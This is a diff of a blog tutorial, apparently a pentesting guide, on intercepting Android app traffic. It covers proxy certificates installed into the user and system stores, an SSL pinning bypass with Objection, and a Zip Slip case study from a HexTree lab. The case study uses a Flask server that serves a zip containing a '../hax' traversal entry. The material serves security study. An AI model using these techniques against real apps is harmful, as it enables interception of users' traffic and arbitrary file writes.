@@ -1,45 +1,40 @@
----  
-title: "The Art of Interception: Cracking Android Network Traffic"  
-date: 2026-01-10 12:00:00 +0200  
-categories: [Mobile Security, Android, Pentesting]  
-tags: [Android, BurpSuite, Frida, SSL Pinning, Hextree]  
-toc: true  
----  
+---
+title: Android Network Traffic Interception Guide
+date: 2026-01-10 12:00:00 +0200
+categories: [Mobile Security, Android]
+tags: [android, burpsuite, frida, ssl pinning, hextree, zip slip]
+toc: true
+---
 
-<div align="center">
-  <h3>║ 𓆲 Unveiling the Hidden Traffic 𓆲 ║</h3>
-  <p>Every app has secrets. It's time to listen in.</p>
-</div>
+𓅃 In the world of Android Penetration Testing, visibility is everything. If you cannot see the network traffic, you are effectively blind to potential vulnerabilities like IDORs, API flaws, or data leakage. Man-in-the-Middle (MitM) attacks allow us to inspect this traffic, but modern Android security features often block these attempts by default.
 
-## 𓅇 The Mission
+This guide outlines a structured methodology for intercepting network traffic and utilizing that access to exploit application logic, based on the approach taught in the HexTree curriculum.
 
-In the world of Android Penetration Testing, if you can't see the traffic, you are fighting blind. Whether you are hunting for IDORs or API vulnerabilities, **Man-in-the-Middle (MitM)** attacks are your bread and butter.
+## Summary photo
 
-But modern Android security doesn't make it easy. Between `TargetSDK` levels and **SSL Pinning**, developers have built walls. Today, we break them down.
+![android-flowchart](assets/img/android-flowchart.png)
 
-## 𖤍 The Strategy (The Flowchart)
+## The Methodology
 
-Before we touch a single tool, we must understand the battlefield. The path we take depends entirely on how the application was built.
+Before attempting to intercept traffic, it is crucial to understand the application's configuration. The path to successful interception depends entirely on how the developer has configured network security and which Android API level the device is running.
 
-> **Note:** This logic is heavily inspired by the methodology taught in the **HexTree** curriculum.
+𖤍 The strategy relies on identifying the weakest link in the trust chain.
 
-<div align="center" style="border: 2px solid #333; padding: 10px; margin: 20px 0;">
-  <img src="/assets/images/android-flowchart.png" alt="Android Network Interception Flowchart" width="100%">
-  <p><em>The Decision Matrix: Memorize this.</em></p>
-</div>
+## Phase 1 Reconnaissance
 
-## 𓅂 Phase 1: Reconnaissance
+The first step is to analyze the AndroidManifest.xml file. We are specifically looking for the networkSecurityConfig attribute within the application tag. This configuration file acts as the map for the application's trust anchors.
 
-First, we need to look into the soul of the application: the `AndroidManifest.xml`. We are looking for the `networkSecurityConfig`.
+### Scenario A Configuration is Missing
 
-### 𓅓 Scenario A: The Config is Missing
-If the developer didn't define a security config, Android defaults to the OS version rules:
+If the developer has not defined a specific network security configuration, the application defaults to the rules of the Android OS version running on the device.
 
-* **Android 6 (API 23) & Below:** 🟢 Easy Mode. The app trusts User Certificates.
-* **Android 7 (API 24) & Above:** 🟠 Hard Mode. The app **only** trusts System Certificates.
+𓅂 Android 6 (API 23) and Below: The application automatically trusts user-installed certificates. This is the ideal scenario.
 
-### 𓅓 Scenario B: The Config EXISTS
-We check the `res/xml/network_security_config.xml`.
+𓆲 Android 7 (API 24) and Above: The application only trusts system-level certificates by default. This requires root access or specific workarounds.
+
+### Scenario B Configuration Exists
+
+If the attribute exists, we must examine the referenced XML file, typically located at res/xml/network_security_config.xml.
 
 ```xml
 <network-security-config>
@@ -51,82 +46,131 @@ We check the `res/xml/network_security_config.xml`.
 </network-security-config>
 ```
 
-## 🐦‍🔥 Phase 2: The Attack Vectors
-Depending on our Recon, we choose our weapon.
+## Phase 2 Attack Vectors
 
-<details>
-<summary><strong>🔻 Click to Expand: Method 1 (The Easy Path - User Certs)</strong></summary>
+Based on the reconnaissance phase, select the appropriate method to establish the proxy.
 
-<p>If the app trusts <code>user</code> certificates (or targets API &lt; 24):</p>
-<ol>
-<li>Export your CA Certificate from Burp Suite / HTTP Toolkit.</li>
-<li>Push it to the device.</li>
-<li>Go to <strong>Settings -> Security -> Install from Storage</strong>.</li>
-<li>Setup your Proxy. <strong>Done.</strong> ✅</li>
-</ol>
-</details>
+### Method 1 User Certificates
 
-<details>
-<summary><strong>🔻 Click to Expand: Method 2 (The System Path - Root Required)</strong></summary>
+This method applies if the application targets API level 23 or lower, or if the network security config explicitly trusts user certificates.
 
-<p>Most modern apps ignore user certs. We must force our cert into the System Store.</p>
-<p><strong>Requirements:</strong> Rooted Device / Emulator (Magisk).</p>
-<p><strong>The Strategy:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Prepare your certificate (hash format)</span>
-openssl x509 <span class="nt">-inform</span> DER <span class="nt">-in</span> burp.der <span class="nt">-out</span> burp.pem
-openssl x509 <span class="nt">-inform</span> PEM <span class="nt">-subject_hash_old</span> <span class="nt">-in</span> burp.pem | head <span class="nt">-1</span>
-mv burp.pem &lt;hash&gt;.0
-<span class="c"># 2. Push to System (Magisk method is safer via modules, but manual works:)</span>
-adb push <hash>.0 /system/etc/security/cacerts/
-adb shell chmod 644 /system/etc/security/cacerts/<hash>.0
-</code></pre></div></div>
-</details>
+- Export the CA Certificate from your proxy tool (Burp Suite or HTTP Toolkit).
+- Transfer the certificate to the Android device.
+- Navigate to Settings > Security > Encryption & Credentials > Install from Storage.
+- Select the certificate and install it.
+- Configure the device WiFi proxy settings to point to your computer's IP address and the listener port.
 
-## 𓅆 Phase 3: The Boss Fight (SSL Pinning)
+### Method 2 System Certificates
 
-So, you installed the certificate in the System store, but the connection still fails? The app is likely using SSL Pinning. It is hard-coded to reject any certificate that isn't the original developer's.
-We need Dynamic Instrumentation. We need Frida.
+For most modern applications (API 24+) that do not explicitly trust user certificates, you must install your proxy certificate into the system trust store. This requires a rooted device or emulator.
 
-### 🪽 The Setup
-Ensure frida-server is running on your Android device.
+First, convert your certificate to the correct format using OpenSSL.
 
 ```bash
-# Check connection
-adb devices
+# Convert DER to PEM if necessary
+openssl x509 -inform DER -in burp.der -out burp.pem
 
-# Verify Frida is running
-frida-ps -Uia | grep "pinned"
+# Get the subject hash
+openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1
+
+# Rename the file to <hash>.0
+mv burp.pem <hash>.0
 ```
 
-### 🪶 The Bypass (Using Objection)
-Instead of writing a custom script immediately, we use Objection for rapid testing.
-Inject into the process:
+Next, push the certificate to the system partition. 𓅓 Note that on newer Android versions, the system partition is read-only and may require overlay filesystem techniques or Magisk modules to modify.
 
 ```bash
+# Push the certificate to the device
+adb push <hash>.0 /data/local/tmp/
+
+# Move to system certificates directory (requires root)
+adb shell
+su
+mount -o remount,rw /system
+cp /data/local/tmp/<hash>.0 /system/etc/security/cacerts/
+chmod 644 /system/etc/security/cacerts/<hash>.0
+reboot
+```
+
+## Phase 3 SSL Pinning Bypass
+
+If you have successfully installed the certificate as a system authority but the application connection fails, the application is likely implementing SSL Pinning.
+
+🪽 To bypass this, we use Dynamic Instrumentation tools like Frida. Ensure frida-server is running on the device, then use Objection for a rapid bypass.
+
+```bash
+# Inject into the process
 objection -g com.example.targetapp explore
-```
 
-Disable Pinning:
-Once inside the Objection shell, run:
-
-```bash
+# Disable Pinning
 android sslpinning disable
 ```
 
-### 𓅉 Success?
-If you see traffic in Burp, you have won. If not, you may need a custom Frida script to target the specific networking library (OkHttp3, Retrofit, etc.).
+## Phase 4 Case Study Zip Path Traversal
 
-## 𓆲 Interactive Checklist
+Once interception is established, we can manipulate traffic to exploit logical vulnerabilities. A classic example is the Zip Path Traversal (Zip Slip) vulnerability found in the HexTree PocketHexMap challenge.
 
-Before you declare an app "un-hackable," did you check everything?
+### The Vulnerability
 
-- [ ] Did you check AndroidManifest.xml?
-- [ ] Is your Proxy listener on All Interfaces?
-- [ ] Is the device actually routing traffic (Wifi settings)?
-- [ ] If Pinning bypass fails, does the app use Native (C++) networking?
+The application downloads a .zip file containing map data and extracts it. However, it fails to validate the filenames inside the archive. If an attacker provides a filename containing directory traversal characters (e.g., ../../file), the file will be written outside the intended directory.
 
-<div align="center">
-<h3>║ 𓅈 Knowledge is Power 𓅈 ║</h3>
-<p><em>"The lock is only as strong as the key is hidden."</em></p>
-<p>𓅃 🪽 🐦‍🔥</p>
-</div>
+### The Exploit Setup
+
+🐦‍🔥 To exploit this, we must intercept the request and redirect it to a malicious Python server running on our machine.
+
+- Redirect Traffic: Configure Burp Suite (using the "Request Handling" tab or HTTP Mock extension) to redirect requests for map.zip to your local Python server.
+- Create the Malicious Server: Use the following Python code to serve a dynamic ZIP file containing the traversal payload.
+
+### The Solution Code
+
+This script serves a ZIP file that exploits the vulnerability to write a file named hax into the downloads root directory.
+
+```python
+from flask import Flask, jsonify, send_file
+import zipfile
+import io
+
+app = Flask(__name__)
+
+@app.route('/map.json')
+def serve_map():
+    # Serve a valid JSON response to trick the app into thinking a map exists
+    response = {
+        "maps-0.13.0_0-path": "maps",
+        "maps-0.13.0_0": [
+            { "name": "hextree-android_continent", "size": "812K", "time": "2024-02" },
+        ]
+    }
+    return jsonify(response)
+
+@app.route('/map.zip')
+def map_archive():
+    # Create the malicious ZIP in memory
+    zip_buffer = io.BytesIO()
+
+    # We use ZIP_DEFLATED for standard compression
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+        # THE EXPLOIT:
+        # usage of "../" allows us to traverse out of the extracted folder.
+        # This will write the file "hax" to the parent downloads directory.
+        zip_file.writestr('../hax', 'Exploit Successful')
+
+    zip_buffer.seek(0)
+    return send_file(zip_buffer, mimetype='application/zip', download_name='map.zip')
+
+if __name__ == '__main__':
+    app.run(debug=True, port=1234)
+```
+
+By running this script and intercepting the network call, the application downloads our malicious archive, processes the ../hax filename, and inadvertently writes our file to the sensitive path.
+
+## Troubleshooting Checklist
+
+If interception is still failing, verify the following points:
+
+- Is the proxy listener on your computer set to listen on "All Interfaces"?
+- Is the Android device actually routing traffic through the proxy?
+- Does the application use a native networking library (C++) instead of Java/Kotlin libraries?
+- Is the certificate valid and not expired?
+
+║ 𓅈 Knowledge is Power ║
